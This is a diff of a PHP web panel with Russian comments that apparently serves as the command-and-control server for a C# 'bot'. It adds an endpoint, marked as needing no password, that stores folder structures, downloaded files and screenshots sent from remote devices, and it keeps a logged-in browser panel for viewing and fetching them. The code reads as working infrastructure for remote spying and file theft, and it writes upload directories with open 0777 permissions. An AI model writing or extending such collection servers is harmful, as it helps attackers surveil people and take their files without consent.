@@ -54,7 +54,50 @@ function cleanOldFiles() {
     }
 }
 
-// ОБРАБОТКА ВХОДА ПО ПАРОЛЮ
+// =========================================================================
+// 1. ПРИЕМ ФАЙЛОВ, СКРИНШОТОВ И СТРУКТУРЫ ОТ C#-БОТА (БЕЗ ТРЕБОВАНИЯ ПАРОЛЯ)
+// =========================================================================
+if (isset($_POST['screenshot_device_id'])) {
+    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['screenshot_device_id']);
+    
+    // Сохранение структуры папок
+    if (isset($_POST['folder_structure'])) {
+        file_put_contents($cache_dir . $dev_id . '_tree.txt', $_POST['folder_structure']);
+        file_put_contents($cache_dir . $dev_id . '_path.txt', $_POST['current_path'] ?? 'C:\\');
+        echo "SERVER_SAVED_STRUCTURE"; 
+        exit;
+    }
+    
+    // Сохранение скачанного файла
+    if (isset($_FILES['downloaded_file'])) {
+        $upload_dir = __DIR__ . '/downloads/';
+        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
+        $filename = basename($_FILES['downloaded_file']['name']);
+        if (move_uploaded_file($_FILES['downloaded_file']['tmp_name'], $upload_dir . $dev_id . '_' . $filename)) {
+            file_put_contents($cache_dir . $dev_id . '_lastfile.txt', $filename);
+            echo "SERVER_SAVED_FILE";
+        }
+        exit;
+    }
+    
+    // Сохранение скриншота
+    if (isset($_FILES['screenshot_file'])) {
+        $upload_dir = __DIR__ . '/screenshots/';
+        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
+        
+        $target_path = $upload_dir . 'screen_' . $dev_id . '.jpg';
+        if (move_uploaded_file($_FILES['screenshot_file']['tmp_name'], $target_path)) {
+            echo "SERVER_SAVED_SCREENSHOT";
+        } else {
+            echo "SERVER_ERROR_SAVE";
+        }
+        exit;
+    }
+}
+
+// =========================================================================
+// 2. АВТОРИЗАЦИЯ ДЛЯ ВЕБ-ПАНЕЛИ (ДЛЯ ЧЕЛОВЕКА В БРАУЗЕРЕ)
+// =========================================================================
 $login_error = "";
 if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['login_password'])) {
     if ($_POST['login_password'] === PANEL_PASSWORD) {
@@ -67,7 +110,6 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['login_password'])) {
     }
 }
 
-// ПРОВЕРКА АВТОРИЗАЦИИ (30 минут)
 $is_authenticated = false;
 if (isset($_SESSION['auth']) && $_SESSION['auth'] === true) {
     if (isset($_SESSION['expire']) && time() > $_SESSION['expire']) {
@@ -78,6 +120,7 @@ if (isset($_SESSION['auth']) && $_SESSION['auth'] === true) {
     }
 }
 
+// Показываем форму входа, если пользователь не авторизован в браузере
 if (!$is_authenticated) {
     ?>
     <!DOCTYPE html>
@@ -110,7 +153,11 @@ if (!$is_authenticated) {
     exit;
 }
 
-// AJAX ОБНОВЛЕНИЕ ДАННЫХ
+// =========================================================================
+// 3. ОСНОВНАЯ ЛОГИКА ВЕБ-ПАНЕЛИ (АВТОРИЗОВАННЫЙ ДОСТУП)
+// =========================================================================
+
+// AJAX ОБНОВЛЕНИЕ ДАННЫХ ДЛЯ ПАНЕЛИ
 if (isset($_GET['api_refresh_all'])) {
     header('Content-Type: application/json');
     
@@ -164,34 +211,7 @@ if (isset($_GET['api_refresh_all'])) {
     exit;
 }
 
-// ПРИЕМ ФАЙЛОВ И СКРИНШОТОВ ОТ БОТА
-if (isset($_POST['screenshot_device_id'])) {
-    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['screenshot_device_id']);
-    
-    if (isset($_POST['folder_structure'])) {
-        file_put_contents($cache_dir . $dev_id . '_tree.txt', $_POST['folder_structure']);
-        file_put_contents($cache_dir . $dev_id . '_path.txt', $_POST['current_path'] ?? 'C:\\');
-        echo "SERVER_SAVED_STRUCTURE"; exit;
-    }
-    if (isset($_FILES['downloaded_file'])) {
-        $upload_dir = __DIR__ . '/downloads/';
-        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
-        $filename = basename($_FILES['downloaded_file']['name']);
-        if (move_uploaded_file($_FILES['downloaded_file']['tmp_name'], $upload_dir . $dev_id . '_' . $filename)) {
-            file_put_contents($cache_dir . $dev_id . '_lastfile.txt', $filename);
-            echo "SERVER_SAVED_FILE";
-        }
-        exit;
-    }
-    if (isset($_FILES['screenshot_file'])) {
-        $upload_dir = __DIR__ . '/screenshots/';
-        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
-        move_uploaded_file($_FILES['screenshot_file']['tmp_name'], $upload_dir . 'screen_' . $dev_id . '.jpg');
-        echo "SERVER_SAVED_SCREENSHOT"; exit;
-    }
-}
-
-// СКАЧИВАНИЕ ФАЙЛОВ
+// СКАЧИВАНИЕ ФАЙЛОВ И СКРИНШОТОВ ЧЕРЕЗ БРАУЗЕР
 if (isset($_GET['get_file']) && isset($_GET['dev'])) {
     $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['dev']);
     $file = __DIR__ . '/downloads/' . $dev_id . '_' . basename($_GET['get_file']);
